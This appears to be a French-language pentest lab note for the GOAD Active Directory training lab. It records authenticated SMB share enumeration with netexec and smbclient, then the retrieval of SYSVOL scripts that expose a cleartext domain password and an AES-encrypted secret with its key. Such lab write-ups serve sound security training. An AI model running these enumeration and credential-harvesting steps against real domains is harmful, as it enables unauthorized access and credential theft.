# Enumeration - GOAD

**Date :** 2026-04-30
**Statut :** ✅ Done

## Objectif
Énumération authentifiée avec `brandon.stark` → SMB shares → SYSVOL → creds en clair.

---

## 1. SMB Shares avec creds brandon.stark

```bash
netexec smb 192.168.56.10 192.168.56.11 192.168.56.22 \
-u brandon.stark -p iseedeadpeople --shares
```

```
WINTERFELL   → [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople ✓
  Share      Permissions  Remark
  ─────────────────────────────────────
  ADMIN$     READ         Remote Admin
  C$         READ         Default share
  IPC$       READ         Remote IPC
  NETLOGON   READ         Logon server share
  SYSVOL     READ         Logon server share ← PRIORITAIRE

KINGSLANDING → [-] sevenkingdoms.local\brandon.stark STATUS_LOGON_FAILURE
               (brandon.stark appartient à north, pas sevenkingdoms)

CASTELBLACK  → Connection Error: NETBIOS timeout
```

---

## 2. SYSVOL Listing récursif

```bash
smbclient //192.168.56.11/SYSVOL \
-U "north.sevenkingdoms.local/brandon.stark%iseedeadpeople" \
-c "recurse ON; ls"
```

```
\north.sevenkingdoms.local
  DfsrPrivate/  → NT_STATUS_ACCESS_DENIED
  Policies/
  scripts/
    script.ps1   (165 bytes)  Wed Apr 29 20:08:42 2026 ← CREDS EN CLAIR
    secret.ps1   (869 bytes)  Wed Apr 29 20:08:45 2026 ← SECRET CHIFFRÉ AES

\north.sevenkingdoms.local\Policies
  {31B2F340-016D-11D2-945F-00C04FB984F9}/
    GPT.INI (22 bytes)
    MACHINE/Microsoft/Windows NT/SecEdit/
      GptTmpl.inf (1192 bytes)
  {6AC1786C-016F-11D2-945F-00C04fB984F9}/
    GPT.INI (22 bytes)
    MACHINE/Microsoft/Windows NT/SecEdit/
      GptTmpl.inf (3764 bytes)
  {8270AEB4-5437-4F26-9FC5-ECF4C6052C24}/
    GPO.cmt (32 bytes)
    GPT.INI (64 bytes)
    Machine/Registry.pol (200 bytes)
    User/Registry.pol (202 bytes)
```

---

## 3. Récupération et lecture des scripts SYSVOL

```bash
smbclient //192.168.56.11/SYSVOL \
-U "north.sevenkingdoms.local/brandon.stark%iseedeadpeople" \
-c "get north.sevenkingdoms.local\scripts\script.ps1; \
    get north.sevenkingdoms.local\scripts\secret.ps1"

cat 'north.sevenkingdoms.local\scripts\script.ps1'
cat 'north.sevenkingdoms.local\scripts\secret.ps1'
```

### Contenu `script.ps1` (165 bytes)

```powershell
# fake script in netlogon with creds
$task = '/c TODO'
$taskName = "fake task"
$user = "NORTH\jeor.mormont"
$password = "_L0ngCl@w_"
# passwords in sysvol still ...
```

> ⚠️ **CREDENTIALS EN CLAIR dans SYSVOL : `NORTH\jeor.mormont` / `_L0ngCl@w_`**

### Contenu `secret.ps1` (869 bytes)

```powershell
# cypher script
# $domain="sevenkingdoms.local"
# $EncryptionKeyBytes = New-Object Byte[] 32
# [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($EncryptionKeyBytes)
# $EncryptionKeyBytes | Out-File "encryption.key"
# $EncryptionKeyData = Get-Content "encryption.key"
# Read-Host -AsSecureString | ConvertFrom-SecureString -Key $EncryptionKeyData | Out-File -FilePath "secret.encrypted"
# secret stored :
$keyData = 177,252,228,64,28,91,12,201,20,91,21,139,255,65,9,247,41,55,164,28,75,132,143,71,62,191,211,61,154,61,216,91
$secret="76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAANQAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA="
# T.L.
```

> 📝 **TODO : Déchiffrer avec `$keyData` (AES 256 bits, clé intégrée)**

---

Tags : #goad #enum #done #pentest
